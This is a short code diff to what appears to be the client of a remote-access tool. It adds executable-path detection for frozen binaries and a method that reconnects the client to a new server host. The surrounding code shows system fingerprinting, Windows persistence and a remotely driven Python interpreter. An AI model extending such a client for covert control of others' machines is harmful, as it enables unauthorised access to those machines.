@@ -68,7 +68,13 @@ class Control(metaclass=abc.ABCMeta):
         info = {"hostname": _hostname, "platform": _platform,
                 "architecture": platform.architecture(), "machine": platform.machine(),
                 "processor": platform.processor(),
-                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}
+                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8}
+        exec_path = os.path.realpath(sys.argv[0])
+
+        if not exec_path.endswith(".py"):
+            exec_path = os.path.realpath(sys.executable)
+
+        info = {**info, "exec_path": exec_path}
 
         if platforms.OS == platforms.WINDOWS:
             p = Persistence()
@@ -442,3 +448,7 @@ class Control(metaclass=abc.ABCMeta):
                                          helper.decode(redirected_output.getvalue().encode()))
             elif command["key"] == SERVER_PYTHON_INTERPRETER_LEAVE:
                 break
+
+    def change_host(self, host):
+        self.es.socket.close()
+        raise errors.ClientSocket.ChangeConnectionDetails(f"{host['host']}:{host['port']}")
